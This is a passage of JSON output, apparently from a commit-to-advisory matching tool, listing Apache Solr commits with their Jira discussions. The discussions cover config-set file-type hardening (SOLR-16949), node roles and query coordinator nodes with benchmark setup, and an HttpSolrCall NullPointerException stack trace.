back-compat breaking. Users using an \"8.11\" docker image, to auto-receive security updates, would see their backups start failing automatically. Perhaps some good defaults could mean no action is necessary for some users. \u00a0Maybe \"/var\" is pre-approved. I don't like the ideas of defaults when Solr has no guidelines for how a filesystem should be setup. Using \"/var\" as a default wouldn't work because the SOLR_HOME/lib and SOLR_CORE/lib could easily be under \"/var\", like they are in the Docker image. Looks good Jan. And maybe the \"slipper slope\" metaphor isn't the right metaphor Jan, I think making the location required going forward is a good idea. And all paths provided in the API would need to be relative to that location (without \"../\"). But I think for 8.11 at least (and probably 9.4.1), we would need to protect without making \"location\" mandatory. (As I've mentioned before). Did some basic cleanup of the 8.11 patch, added some javadoc, when traversing folders, skip only \".\" and \"..\", not every folder starting with a \".\". Ran \"ant precommit\". Do you have a suggestion for CHANGES.txt entry and JIRA number to use? Looks good to me Jan. I would use this JIRA. And something simple like \"Restrict certain file types from being uploaded with or downloaded from Config Sets.\" Pushed to branch_8_11 in https://github.com/apache/lucene-solr/commit/7e9a2e67f812032a049836c3aa0b18bf5cd717f9 I have updated the patch for main branch with latest updates from 8.11 patch: SOLR-16949.patch Precommit passes and I am ready to merge. Do we want to avoid the extra publicity that a PR gives, by pushing directly from the command line? If so, I'm grateful for a patch review of the updated patch. Note: I kept the patch from SOLR-16480 intact, but we could do another JIRA to remove that filename-suffix feature from main branch after this has landed. That patch for main looks good to me Jan, I would push directly to main (and backport of course) without PRs. As for SOLR-16480 , I do think we should have a Jira to remove that in main, after this has landed. main: https://github.com/apache/solr/commit/15534754f492079e52288dd11abaf1c4261b3ea4 branch_9x: https://github.com/apache/solr/commit/644dd3a6d6780d71030f7070754d2f3adce22859 branch_9_4: https://github.com/apache/solr/commit/ad6854b04361e351e08aa8f39fb7ff0e8fedc9a2 There's some local (and Jenkins) test failures that look related to this change, particularly in TestConfigSetService and TestFileSystemConfigSetService. See this Jenkins build for an example.  (I've also attached the Jenkins logs, so they're preserved after our build-retention rolls over.) jenkins.log.txt.gz At a glance it looks like the problem is that this change introduces some InputStream leaks ] in our ConfigSet code.  Seems like a simple-ish fix?  I suspect one of you guys might already be aware of this and working on a fix, and I don't want to duplicate effort.  But if you aren't already on it, lmk and I can toss a fix together. Yea, looks like some careless stream handling there. Taking a look. Fix in SOLR-16949-inputstream-leaks.patch . This patch passes Path objects instead of InputStream and also uses the File and byte[] methods of SimpleMagic library instead of always converting to InputStream. Also streamlines tests with try-with-resources. I ran the entire test suite locally, so committed right away: main: https://github.com/apache/solr/commit/c89813a675663bb82f18236840b2a84cac05e1ee branch_9x: https://github.com/apache/solr/commit/c79011e81dada2f9bc4b4df32ffb32152ef81152 branch_9_4: https://github.com/apache/solr/commit/ce2813c97f70b5e83ece80455aad74a1fd7eeca6 A belated LGTM on the resource-leak fix; thanks Jan! Yep, looks good. Doesn't look like branch_8_11 code is directly using the same code, except some tests that may be leaking streams. I'll have a look at pushing a patch to that branch too. Backport of inputstream handling to branch_8_11: https://github.com/apache/lucene-solr/commit/6c8f24eb9e3fe1cb19058173f2e221de3febfeda Closing after the 9.4.1 release"
            },
            "ghissue_refs": {},
            "cve_refs": [],
            "twins": [],
            "tags": [
                "releases/lucene-solr/8.11.3"
            ],
            "matched_rules": [
                {
                    "id": "XREF_BUG",
                    "message": "The commit and the advisory (including referenced pages) mention the same bug tracking ticket: SOLR-16949",
                    "relevance": 32
                },
                {
                    "id": "CHANGES_RELEVANT_FILES",
                    "message": "The commit changes some relevant files: solr/core/src/java/org/apache/solr/util/FileTypeMagicUtil.java",
                    "relevance": 8
                },
                {
                    "id": "SEC_KEYWORDS_IN_LINKED_BUG",
                    "message": "The bug tracking ticket SOLR-16949 contains some security-related terms: hardening, security, vulnerable, rce",
                    "relevance": 4
                },
                {
                    "id": "BUG_IN_MESSAGE",
                    "message": "The commit message references some bug tracking ticket: SOLR-16949",
                    "relevance": 2
                }
            ]
        },
        {
            "commit_id": "68fa493b8f959788216eb48f6bcef825fe8e24e6",
            "repository": "https://github.com/apache/lucene-solr",
            "timestamp": 1698090306,
            "hunks": 79,
            "message": "Revert \"SOLR-15694, SOLR-15715: Node roles and dedicated query coordinator nodes\" This reverts commit 2088d743db9304492ab19c14bc80c6187f172b79.",
            "changed_files": [
                "solr/contrib/analytics/src/java/org/apache/solr/handler/component/AnalyticsComponent.java",
                "solr/contrib/ltr/src/java/org/apache/solr/ltr/response/transform/LTRFeatureLoggerTransformerFactory.java",
                "solr/contrib/ltr/src/java/org/apache/solr/ltr/search/LTRQParserPlugin.java",
                "solr/core/src/java/org/apache/solr/api/CoordinatorV2HttpSolrCall.java",
                "solr/core/src/java/org/apache/solr/cloud/api/collections/Assign.java",
                "solr/core/src/java/org/apache/solr/cloud/api/collections/CategoryRoutedAlias.java",
                "solr/core/src/java/org/apache/solr/cloud/api/collections/CreateCollectionCmd.java",
                "solr/core/src/java/org/apache/solr/cloud/api/collections/RestoreCmd.java",
                "solr/core/src/java/org/apache/solr/cloud/api/collections/RoutedAlias.java",
                "solr/core/src/java/org/apache/solr/cloud/api/collections/TimeRoutedAlias.java",
                "solr/core/src/java/org/apache/solr/core/CoreContainer.java",
                "solr/core/src/java/org/apache/solr/core/NodeRoles.java",
                "solr/core/src/java/org/apache/solr/handler/ClusterAPI.java",
                "solr/core/src/java/org/apache/solr/handler/RequestHandlerBase.java",
                "solr/core/src/java/org/apache/solr/handler/SolrConfigHandler.java",
                "solr/core/src/java/org/apache/solr/handler/admin/ShowFileRequestHandler.java",
                "solr/core/src/java/org/apache/solr/handler/component/HttpShardHandler.java",
                "solr/core/src/java/org/apache/solr/handler/component/HttpShardHandlerFactory.java",
                "solr/core/src/java/org/apache/solr/handler/component/QueryComponent.java",
                "solr/core/src/java/org/apache/solr/handler/component/RealTimeGetComponent.java",
                "solr/core/src/java/org/apache/solr/handler/component/SearchHandler.java",
                "solr/core/src/java/org/apache/solr/request/DelegatingSolrQueryRequest.java",
                "solr/core/src/java/org/apache/solr/request/SimpleFacets.java",
                "solr/core/src/java/org/apache/solr/request/SolrQueryRequest.java",
                "solr/core/src/java/org/apache/solr/response/transform/CoreAugmenterFactory.java",
                "solr/core/src/java/org/apache/solr/response/transform/TransformerFactory.java",
                "solr/core/src/java/org/apache/solr/search/JoinQParserPlugin.java",
                "solr/core/src/java/org/apache/solr/search/join/ScoreJoinQParserPlugin.java",
                "solr/core/src/java/org/apache/solr/servlet/CoordinatorHttpSolrCall.java",
                "solr/core/src/java/org/apache/solr/servlet/HttpSolrCall.java",
                "solr/core/src/java/org/apache/solr/servlet/SolrDispatchFilter.java",
                "solr/core/src/java/org/apache/solr/update/UpdateLog.java",
                "solr/core/src/java/org/apache/solr/update/processor/DistributedUpdateProcessorFactory.java",
                "solr/core/src/java/org/apache/solr/update/processor/RoutedAliasUpdateProcessor.java",
                "solr/core/src/test-files/solr/configsets/cache-control/conf/schema.xml",
                "solr/core/src/test-files/solr/configsets/cache-control/conf/solrconfig.xml",
                "solr/core/src/test-files/solr/configsets/conf3/conf/schema.xml",
                "solr/core/src/test-files/solr/configsets/conf3/conf/solrconfig.xml",
                "solr/solrj/src/java/org/apache/solr/client/solrj/SolrRequest.java",
                "solr/solrj/src/java/org/apache/solr/client/solrj/impl/BaseCloudSolrClient.java",
                "solr/solrj/src/java/org/apache/solr/common/cloud/ZkStateReader.java",
                "solr/test-framework/src/java/org/apache/solr/SolrTestCaseJ4.java"
            ],
            "message_reference_content": [],
            "jira_refs": {
                "SOLR-15694": "I think we should have first class support for starting a Solr node in a mode whereby no cores will be placed on them. These nodes are useful for certain scenarios: Dedicated overseer nodes Nodes where only plugins are installed and used (e.g. cluster/node level plugins) Dedicated nodes for querying (more on this to come later). Today, to achieve this effect, one can: 1. start a node (which will make it join live_nodes and be immediately available for replica placement). 2. Put replica placement rules or autoscaling policies to prevent replicas from being placed there. This is not standardized, 8x has two ways to achieve this (replica placement rules and autoscaling framework), 9x has a new autoscaling framework. Proposing a start parameter for starting a node that starts the node in this configuration, and then internally this is handled appropriately (across 8x and 9x). This should be Kubernetes/Docker friendly as well, since it is easy to add an additional parameter for a startup (instead of putting things into autoscaling.json in ZK via init scripts). Concept of node roles and non-data nodes This has been discussed many times. I think it should be a generic concept of a \"node role\", which can then be one or more roles that will dictate how the node acts. One role coud be \"zk\", which would let the node start an embedded zookeeper (for a future managed zk feature), and then you could combine it with \"data\" if the node should also be eligible for index/search. There may be other roles such as \"streaming\" perhaps which would only host streaming expression jobs, etc. This is definitely SIP worthy. janhoy , thanks. That is good feedback. This has been discussed many times. Can you please point me to that? Will link to that in future discussions. I think it should be a generic concept of a \"node role\", which can then be one or more roles that will dictate how the node acts. Today, we have a role \"overseer\" for a node. However, many users look for dedicated overseer nodes (nodes that don't handle querying or indexing), and there's no easy way today. and then you could combine it with \"data\" if the node should also be eligible for index/search. Do you recommend that we have a role \"data\" for nodes (regular nodes as we have today)? In that case, what would absence of this \"data\" role for a node mean the node doesn't host any cores? This seems reasonable for what I intend to achieve with usecases I have in mind. This is definitely SIP worthy. I'll create one, thanks janhoy We already have a file /roles.json in ZK. It has a key called \"overseer\" now. We can add a new key called \"query-nodes\" and add nodes to that Ah, did not know about that. A thousand questions pop up, such as: Should roles be supported in leader/follower mode? What would be the best way to designate roles to a node? A global file in ZK like /roles.json is one way. ENV_VARs or SysProps at each node is another. How dynamic do we need this to be, are there business needs to (re)assign roles at runtime, and in that case do we need a REST API for it? If dynamic, what role(s) would a brand new node (or k8s pod) added to the cluster be assigned? What happens if you have only assigned a role to one node and that node leaves the cluster? Should that be configurable, or would there be some cluster level plugin monitoring events, that makes such decisions? etc etc Looking forward to seeing a SIP with a thorough design and recommendation on this. Looking forward to seeing a SIP with a thorough design and recommendation on this. I'll write up the SIP today. We can address these questions there and link to this JIRA. Here's the SIP: https://cwiki.apache.org/confluence/display/SOLR/SIP-15+Node+roles Discussion is happening here: https://lists.apache.org/thread.html/rb3cbfddb6e3af9c671d037ce1e7341544a2f1ab287f184c8f53ac44c%40%3Cdev.solr.apache.org%3E Browsing the other SIPs, SIP-11 is potentially related, as ir proposes some nice cleanup of accessing cluster-level config. Not saying we should not wait for that, but I'll ping ab to explore synergies. Commit 24e5ba7105ea774de0b319337c6809d2839b9f8a in solr's branch refs/heads/jira/SOLR15694 from Ishan Chattopadhyaya [ https://gitbox.apache.org/repos/asf?p=solr.git;h=24e5ba7 ] SOLR-15694 : Ref guide changes Commit e32e58c20be0540c6e89679a57aac26616911e3d in solr's branch refs/heads/main from Ishan Chattopadhyaya [ https://gitbox.apache.org/repos/asf?p=solr.git;h=e32e58c ] SOLR-15694 : Node roles Commit e19a13f8146a713fe883c9a17809dc542638cc85 in solr's branch refs/heads/branch_9x from Ishan Chattopadhyaya [ https://gitbox.apache.org/repos/asf?p=solr.git;h=e19a13f ] SOLR-15694 : Node roles Can you close this and also move SIP-15 to correct section in the list? https://cwiki.apache.org/confluence/display/SOLR/Solr+Improvement+Proposals ichattopadhyaya why is this till open? Also the SIP (see previous comment) is listed as \"under discussion\". I'll try once moce ichattopadhyaya noble.paul Can you please move the SIP-15 to the \"Implemented\" section here https://cwiki.apache.org/confluence/display/SOLR/Solr+Improvement+Proposals ? Done. Commit 2088d743db9304492ab19c14bc80c6187f172b79 in lucene-solr's branch refs/heads/branch_8_11 from Ishan Chattopadhyaya [ https://gitbox.apache.org/repos/asf?p=lucene-solr.git;h=2088d743db9 ] SOLR-15694 , SOLR-15715 : Node roles and dedicated query coordinator nodes Co-authored-by: Noble Paul <noble@apache.org> Commit 68fa493b8f959788216eb48f6bcef825fe8e24e6 in lucene-solr's branch refs/heads/branch_8_11 from Ishan Chattopadhyaya [ https://gitbox.apache.org/repos/asf?p=lucene-solr.git;h=68fa493b8f9 ] Revert \" SOLR-15694 , SOLR-15715 : Node roles and dedicated query coordinator nodes\" This reverts commit 2088d743db9304492ab19c14bc80c6187f172b79. Commit 2da4332072ffffb0581ef60d11de5b0d157452ac in lucene-solr's branch refs/heads/branch_8_11 from Ishan Chattopadhyaya [ https://gitbox.apache.org/repos/asf?p=lucene-solr.git;h=2da4332072f ] SOLR-15694 , 15715: Node roles and dedicated query coordinator nodes Commit b54a788fe71c7f87a8b8564461cb196c138fc7ce in lucene-solr's branch refs/heads/branch_8_11 from noblepaul [ https://gitbox.apache.org/repos/asf?p=lucene-solr.git;h=b54a788fe71 ] SOLR-15694 , 15715: Create ephemeral roles properly (missed backporting these changes last time) Commit 002b3ce67bea7dfe114c3b7dfdceb00b8777363c in lucene-solr's branch refs/heads/branch_8_11 from Ishan Chattopadhyaya [ https://gitbox.apache.org/repos/asf?p=lucene-solr.git;h=002b3ce67be ] Revert \" SOLR-15694 , 15715: Create ephemeral roles properly (missed backporting these changes last time)\" This reverts commit b54a788fe71c7f87a8b8564461cb196c138fc7ce. Commit ace7641edb762d31519df1db845885dfd31caee4 in lucene-solr's branch refs/heads/branch_8_11 from noblepaul [ https://gitbox.apache.org/repos/asf?p=lucene-solr.git;h=ace7641edb7 ] SOLR-15694 , 15715: Create ephemeral roles properly (missed backporting these changes last time) Hi ichattopadhyaya , We are trying to use the Node roles feature to set a preferred Overseer in our Solr 9 fork. What is the purpose of having overseerDesignate in addition to specifying a preferredOverseer ? How is it specified via startup parameters? In our fork, I am configuring one node in the SolrCloud cluster with -Dsolr.node.roles=overseer:preferred,data:on . All other nodes are set to overseer:allowed,data:on by default. I have observed that during a rolling restart, the OverseerNodePrioritizer almost always elects the preferred Overseer as the Overseer, provided it is up. Additionally, since the overseerDesignate list remains empty (until the preferred Overseer is added to it), it does not affect this outcome.",
                "SOLR-15715": "We have a large collection with 1000s of shards in the solr cluster. We have observed that distributed solr query takes many resources(thread, memory, etc.) on the solr data node(node which contains indexes). Thus we need dedicated query nodes to execute distributed queries on large solr collection. That would reduce the memory/cpu pressure from solr data nodes. Elastis search has similar functionality here noble.paul ichattopadhyaya Dedicated query coordinator nodes in the solr cluster Related to SOLR-15694 I'd like to point out here that this feature is a donation from FullStory, where hiteshkhamesra implemented this solution that has already brought immense benefits on large Solr clusters. As part of this JIRA, we plan to upstream that functionality so that broader Solr community can benefit. While we've seen substantial reduction of memory usage on data hosting nodes in production for FullStory's internal workloads, I shall publish benchmarks for this feature on publicly available datasets soon. I just wrapped up an initial round of testing on regular setup (6 data nodes) POC setup (1 dedicated overseer + 1 coordinator + 6 data nodes). Setup details Regular setup: 6 nodes 2GB heap space on every node 6 collections, 6 shards each, 1 replica per shard Documents 30M per collection (ecommerce events dataset) Queries: 20,000 per collection, all queries on faceting (filtered by timeranges) Query rate: 2 threads per collection, 6 collections at the same time. Query target node: first data node ( port 50000 ) POC setup: 8 nodes: 1 dedicated overseer, 1 coordinator node, 6 data nodes 2GB heap space on every node 6 collections, 6 shards each, 1 replica per shard Documents 30M per collection (ecommerce events dataset) Queries: 20,000 per collection, all queries on faceting (filtered by timeranges) Query rate: 2 threads per collection, 6 collections at the same time. Query target node: coordinator node ( port 50001 ) Performance results Here are the results, Regular setup results: POC results: Conclusion Due to a separate coordinator node, memory usage on data nodes very low. Isolated coordinator node feature for query aggregation working as designed. A well known issue with this model is that the aggregation nodes can a. become bottlenecks to the overall throughput and b. cause outages if they are not scaled correctly. In an aggregation heavy system, these nodes will become the target of maximum load, thus potentially causing a skew in the cluster where the data nodes are relatively lower loaded vs the aggregation nodes bearing most of the load. To sustain that, a separate scalability model will be required for the aggregation nodes, thus leading to more complexity and state. Compared to status quo, in a state of high load, the chances of the cluster running into a cascading failure mode are higher for this solution. What are the steps taken to avoid the situation described above, and what kind of testing/simulation has been performed for the same? To sustain that, a separate scalability model will be required for the aggregation nodes, thus leading to more complexity and state. What do you mean by a \"separate scalability model\"? These query aggregation nodes are stateless and can be scaled up and down independently of the data nodes. Cost of bringing up a new aggregation node and bringing down a misbehaving aggregation node is much lower than misbehaving nodes with data in it. What are the steps taken to avoid the situation described above, and what kind of testing/simulation has been performed for the same? At FullStory, this solution has been running in a production Solr cluster with hundreds of nodes for several months now with immense benefits in reducing load on the data nodes. Cost of bringing up a new aggregation node and bringing down a misbehaving aggregation node is much lower than misbehaving nodes with data in it. { } That is exactly what I want to understand \u2013 how do you scale these nodes up? Are these autoscaled? What is the implication of scaling these nodes on the metadata storage (i.e. ZK state) and the overseer? You are concentrating a load (that was previously distributed) on a few select nodes, so the probability of needing to scale these nodes is high. That can eventually mean a larger cluster overall, since you aren't really removing any data nodes? At FullStory, this solution has been running in a production Solr cluster with hundreds of nodes for several months now with immense benefits in reducing load on the data nodes. While I am glad to hear that, I would still like to see a simulated (and reproducible) benchmark that targets the above mentioned scenario and demonstrates the said feature's handling of the same. That is exactly what I want to understand \u2013 how do you scale these nodes up? Are these autoscaled? What is the implication of scaling these nodes on the metadata storage (i.e. ZK state) and the overseer? It is possible to use Kubernetes or AWS autoscaling based on QPS or other load metrics to provision more of these query aggregation nodes. If this feature leverages the Node Roles feature (SIP-15), then the implication of having many query aggregation nodes would be that there will be many ephemeral nodes added to the /node-roles subtree (nested under coordinator role). {{You are concentrating a load (that was previously distributed) on a few select nodes, so the probability of needing to scale these nodes is high. }} An important benefit of isolating the cost of query aggregation is that while super expensive queries (queries of death) can still take down aggregation nodes, but data nodes still continue to function. Regarding the \"need is high\" for scaling up these query aggregation nodes, I think it is dependent on the workload and I'm not at liberty to disclose the exact details of FullStory's production workload. I would still like to see a simulated (and reproducible) benchmark that targets the above mentioned scenario and demonstrates the said feature's handling of the same. The benchmark I posted above is one such simulated benchmark which is reproducible (I'll share the steps to reproduce it once we have a PR opened). There might be many more reproducible benchmarks to come for this feature, each highlighting different aspects of this solution. Regarding the \"need is high\" for scaling up these query aggregation nodes, I think it is dependent on the workload and I'm not at liberty to disclose the exact details of FullStory's production workload. Having said that, I don't expect that anyone except a tiny minority of users would find this feature helpful. And, as you mentioned, even for those who find this useful, it might be necessary to weigh the tradeoffs that are involved (having additional nodes on top of the data nodes vs. whatever benefits can be had). This is going to be an opt-in feature. In this JIRA, I don't think we can address all such real world scenarios in order to be able to provide definitive guidance whether this will be useful for a particular scenario or not. An important benefit of isolating the cost of query aggregation is that while super expensive queries (queries of death) can still take down aggregation nodes, but data nodes still continue to function. That is true when the majority of workload is non aggregation. On the other hand, if the majority of the workload is aggregation heavy, we are essentially creating a skew in the cluster, keeping majority of nodes free and focusing the heavy lifting to a few nodes \u2013 which will lead to either a set of cascading failures or additional nodes, thus pushing up the cost and increasing cluster management complexity. I am interested in seeing that kind of a benchmark to see how this solution behaves in that situation. Copying a comment I made on the PR because I think it is a slightly larger discussion and might need more eyes on it. Design point: I'm not a fan of putting the coreNameMapping into the CoreContainer's objectCache. It feels kludgey and like we're using that as a grab bag for everything. It's not discoverable and probably not maintainable. I'd like to see this rearchitected in some ways for CoreContainer to allow roles to register themselves with it, and then there's a specific entry per role. And hopefully that's a domain object that can be extendable in the future. So instead of ObjectCache we have a map called RoleData that is maybe Map<Role, Object> and each role knows what that entry is. It feels kludgey and like we're using that as a grab bag for everything. I agree that it is a bit \"kludgey\". However I do not believe all roles need to register some data with CoreContainer. I shall try to make it cleaner Here are final benchmark numbers. Setup Branch: https://github.com/apache/solr/pull/996 No. of Solr nodes: 6 (1 dedicated overseer, 1 coordinator node, 4 regular data nodes) No. of collections: 1 No. of shards: 256 No. of documents: 25 million No. of queries: 2000 (faceting queries, a few join queries) Hardware: One machine with 64GB RAM, at least 16 CPUs. Suite: https://github.com/fullstorydev/solr-bench/blob/master/coordinator-node.json Comparison: Scenario 1) All queries sent to the dedicated overseer node, and hence forwarded to data nodes and executed there. Scenario 2) All queries sent to coordinator node, hence executed on that node. Results Here are the heap usage graphs. The left graphs are for scenario 1 (queries executed on data nodes) and right graphs are scenario 2 (queries executed on coordinator node). It is clear that the heap usage on data nodes (ports 50002+) is less in scenario 2. Reproducing these benchmarks On a laptop, desktop or VM, with at least 64GB RAM and 16 CPUs, do the following: 1. git clone https://github.com/fullstorydev/solr-bench 2. apt install wget unzip zip ant ivy lsof git netcat make openjdk-11-jdk maven jq 3. mvn clean compile assembly:single 4. ./stress.sh coordinator-node.json To run scenario 1, keep the `query-node` to 1 in `querying` section of `task-types` (coordinator-node.json). To run scenario 2, change it to 2. Here 1 and 2 represent the node index (check the `startup-params-overrides` in `cluster` section). To plot the graphs, run `python2.6 -m SimpleHTTPServer 9000` (after a run) and open http://localhost:9000/plot-stress.html on the browser to view the graphs. Narrow down to \"Task 3\" for graphs only during the query phase. I plan to merge the PR #996 soon. It is clear that the heap usage on data nodes (ports 50002+) is less in scenario 2. Can you pretend that I'm a junior engineer and explain this conclusion to me? Can you pretend that I'm a junior engineer and explain this conclusion to me? It seems that during the query phase, a data node (lets say the red line) goes through 9 cycles of GC in scenario 1, whereas during scenario 2 same line goes via 6 cycles. Hence, I arrived at the conclusion that there's less GC cycles, thus indicating lower heap usage, when using coordinator nodes for querying. Does it make sense, Mike? Commit d029eb14aa8fbb592938f67bd1397bd8fe805168 in solr's branch refs/heads/main from Noble Paul [ https://gitbox.apache.org/repos/asf?p=solr.git;h=d029eb14aa8 ] SOLR-15715 : Dedicated query coordinator nodes in the solr cluster (#996) Commit 05f72879b33f389d89baaf7559ea03eb9aef2e89 in solr's branch refs/heads/branch_9x from Noble Paul [ https://gitbox.apache.org/repos/asf?p=solr.git;h=05f72879b33 ] SOLR-15715 : Dedicated query coordinator nodes in the solr cluster (#996) Thanks to everyone for reviews and contribution. Bulk closing 9.1 issues. Commit 2088d743db9304492ab19c14bc80c6187f172b79 in lucene-solr's branch refs/heads/branch_8_11 from Ishan Chattopadhyaya [ https://gitbox.apache.org/repos/asf?p=lucene-solr.git;h=2088d743db9 ] SOLR-15694 , SOLR-15715 : Node roles and dedicated query coordinator nodes Co-authored-by: Noble Paul <noble@apache.org> Commit 68fa493b8f959788216eb48f6bcef825fe8e24e6 in lucene-solr's branch refs/heads/branch_8_11 from Ishan Chattopadhyaya [ https://gitbox.apache.org/repos/asf?p=lucene-solr.git;h=68fa493b8f9 ] Revert \" SOLR-15694 , SOLR-15715 : Node roles and dedicated query coordinator nodes\" This reverts commit 2088d743db9304492ab19c14bc80c6187f172b79. Obviously very late to the party, and likely have missed something, but looking at this and some of the code, I'm given to wonder why this wasn't achieved via client request preferences (which was implemented), node labeling, and replica placement (to ensure certain labeled nodes never get data). Nodes without data that receive all the client requests is job done, right? In the current code it seems that only tests will ever call \"setPreferredNodes()\" which makes me think that this feature only works if the end-user client is manually tracking what nodes are coordinators? I guess my biggest Q is why do we need subclasses of HttpSolrCall? This seems achievable with node labels, a node role that adds a label, client smarts, and replica placement. I see a bunch of references to \"synthetic collection\" in the code, but it's not clear what this is or why its needed. From the javadoc: /**\r\n * A coordinator node can serve requests as if it hosts all collections in the cluster. it does so\r\n * by hosting a synthetic replica for each configset used in the cluster. Why do we want to do that? Existing code already knew how to find shards, delegate sub requests and coordinate a response, why do we need to fake the location of the collections with a synthetic replica? Gus, without this feature, how does one get a core/replica onto a coordinator node that has no data?  Normally a core is part of a shard and that shard has data like all the others.  This only partially addresses your questions; I don't have all the answers.  I think I would have rather seen a special shard; maybe having no range and/or having a special state.  But I think an aspect of the solution here is to have an approach that scales to many collections, thus don't want many empty cores.  So instead I could imagine a collection that is able to query any other collection. I noticed an interesting new issue & PR on this feature recently SOLR-17118 ."
            },
            "ghissue_refs": {},
            "cve_refs": [],
            "twins": [],
            "tags": [
                "releases/lucene-solr/8.11.3"
            ],
            "matched_rules": [
                {
                    "id": "RELEVANT_WORDS_IN_MESSAGE",
                    "message": "The commit message contains some relevant words: This",
                    "relevance": 8
                },
                {
                    "id": "CHANGES_RELEVANT_CODE",
                    "message": "The commit modifies code containing relevant filename or methods: This, ZooKeeper, SolrCloud, Solr",
                    "relevance": 8
                },
                {
                    "id": "CHANGES_RELEVANT_FILES",
                    "message": "The commit changes some relevant files: solr/core/src/java/org/apache/solr/cloud/api/collections/RoutedAlias.java, solr/core/src/java/org/apache/solr/cloud/api/collections/Assign.java, solr/core/src/java/org/apache/solr/request/SimpleFacets.java, solr/core/src/test-files/solr/configsets/conf3/conf/schema.xml, solr/core/src/java/org/apache/solr/handler/ClusterAPI.java, solr/core/src/java/org/apache/solr/search/join/ScoreJoinQParserPlugin.java, solr/core/src/java/org/apache/solr/cloud/api/collections/CategoryRoutedAlias.java, solr/core/src/java/org/apache/solr/handler/RequestHandlerBase.java, solr/core/src/java/org/apache/solr/core/CoreContainer.java, solr/solrj/src/java/org/apache/solr/common/cloud/ZkStateReader.java, solr/core/src/java/org/apache/solr/servlet/CoordinatorHttpSolrCall.java, solr/contrib/ltr/src/java/org/apache/solr/ltr/search/LTRQParserPlugin.java, solr/contrib/ltr/src/java/org/apache/solr/ltr/response/transform/LTRFeatureLoggerTransformerFactory.java, solr/solrj/src/java/org/apache/solr/client/solrj/impl/BaseCloudSolrClient.java, solr/core/src/java/org/apache/solr/update/processor/DistributedUpdateProcessorFactory.java, solr/core/src/java/org/apache/solr/cloud/api/collections/TimeRoutedAlias.java, solr/core/src/java/org/apache/solr/handler/admin/ShowFileRequestHandler.java, solr/core/src/java/org/apache/solr/request/DelegatingSolrQueryRequest.java, solr/core/src/java/org/apache/solr/response/transform/CoreAugmenterFactory.java, solr/core/src/java/org/apache/solr/handler/component/HttpShardHandler.java, solr/core/src/java/org/apache/solr/response/transform/TransformerFactory.java, solr/core/src/java/org/apache/solr/search/JoinQParserPlugin.java, solr/core/src/java/org/apache/solr/update/processor/RoutedAliasUpdateProcessor.java, solr/core/src/java/org/apache/solr/cloud/api/collections/RestoreCmd.java, solr/core/src/java/org/apache/solr/servlet/SolrDispatchFilter.java, solr/solrj/src/java/org/apache/solr/client/solrj/SolrRequest.java, solr/core/src/java/org/apache/solr/request/SolrQueryRequest.java, solr/core/src/test-files/solr/configsets/cache-control/conf/schema.xml, solr/core/src/java/org/apache/solr/servlet/HttpSolrCall.java, solr/core/src/java/org/apache/solr/handler/component/HttpShardHandlerFactory.java, solr/core/src/java/org/apache/solr/handler/component/RealTimeGetComponent.java, solr/core/src/test-files/solr/configsets/cache-control/conf/solrconfig.xml, solr/test-framework/src/java/org/apache/solr/SolrTestCaseJ4.java, solr/core/src/java/org/apache/solr/handler/SolrConfigHandler.java, solr/contrib/analytics/src/java/org/apache/solr/handler/component/AnalyticsComponent.java, solr/core/src/java/org/apache/solr/handler/component/SearchHandler.java, solr/core/src/java/org/apache/solr/core/NodeRoles.java, solr/core/src/java/org/apache/solr/update/UpdateLog.java, solr/core/src/java/org/apache/solr/cloud/api/collections/CreateCollectionCmd.java, solr/core/src/test-files/solr/configsets/conf3/conf/solrconfig.xml, solr/core/src/java/org/apache/solr/handler/component/QueryComponent.java, solr/core/src/java/org/apache/solr/api/CoordinatorV2HttpSolrCall.java",
                    "relevance": 8
                },
                {
                    "id": "ADV_KEYWORDS_IN_FILES",
                    "message": "An advisory keyword is contained in the changed files: handler, read, request, actor, clouds",
                    "relevance": 4
                },
                {
                    "id": "BUG_IN_MESSAGE",
                    "message": "The commit message references some bug tracking ticket: SOLR-15694, SOLR-15715",
                    "relevance": 2
                }
            ]
        },
        {
            "commit_id": "f33d102f254909492b6f5d5a2142dfea791a5a4a",
            "repository": "https://github.com/apache/lucene-solr",
            "timestamp": 1698073289,
            "hunks": 3,
            "message": "SOLR-17034: Hitting /solr// ends up with HttpSolrCall NPE when using Solr Cloud (#2020)",
            "changed_files": [
                "solr/core/src/java/org/apache/solr/servlet/HttpSolrCall.java"
            ],
            "message_reference_content": [],
            "jira_refs": {
                "SOLR-17034": "Hitting /solr// causes the following stack trace: \"error\" :{ \"trace\" : \"java.lang.NullPointerException\\n\\tat org.apache.solr.servlet.HttpSolrCall.getCoreUrl(HttpSolrCall.java:1047)\\n\\tat org.apache.solr.servlet.HttpSolrCall.getRemoteCoreUrl(HttpSolrCall.java:1021)\\n\\tat org.apache.solr.servlet.HttpSolrCall.extractRemotePath(HttpSolrCall.java:428)\\n\\tat org.apache.solr.servlet.HttpSolrCall.init(HttpSolrCall.java:293)\\n\\tat org.apache.solr.servlet.HttpSolrCall.call(HttpSolrCall.java:522)\\n\\tat org.apache.solr.servlet.SolrDispatchFilter.doFilter(SolrDispatchFilter.java:427)\\n\\tat org.apache.solr.servlet.SolrDispatchFilter.doFilter(SolrDispatchFilter.java:357)\\n\\tat org.eclipse.jetty.servlet.FilterHolder.doFilter(FilterHolder.java:201)\\n\\tat org.eclipse.jetty.servlet.ServletHandler$Chain.doFilter(ServletHandler.java:1601)\\n\\tat org.eclipse.jetty.servlet.ServletHandler.doHandle(ServletHandler.java:548)\\n\\tat org.eclipse.jetty.server.handler.ScopedHandler.handle(ScopedHandler.java:143)\\n\\tat org.eclipse.jetty.security.SecurityHandler.handle(SecurityHandler.java:600)\\n\\tat org.eclipse.jetty.server.handler.HandlerWrapper.handle(HandlerWrapper.java:127)\\n\\tat org.eclipse.jetty.server.handler.ScopedHandler.nextHandle(ScopedHandler.java:235)\\n\\tat org.eclipse.jetty.server.session.SessionHandler.doHandle(SessionHandler.java:1624)\\n\\tat org.eclipse.jetty.server.handler.ScopedHandler.nextHandle(ScopedHandler.java:233)\\n\\tat org.eclipse.jetty.server.handler.ContextHandler.doHandle(ContextHandler.java:1434)\\n\\tat org.eclipse.jetty.server.handler.ScopedHandler.nextScope(ScopedHandler.java:188)\\n\\tat org.eclipse.jetty.servlet.ServletHandler.doScope(ServletHandler.java:501)\\n\\tat org.eclipse.jetty.server.session.SessionHandler.doScope(SessionHandler.java:1594)\\n\\tat org.eclipse.jetty.server.handler.ScopedHandler.nextScope(ScopedHandler.java:186)\\n\\tat org.eclipse.jetty.server.handler.ContextHandler.doScope(ContextHandler.java:1349)\\n\\tat 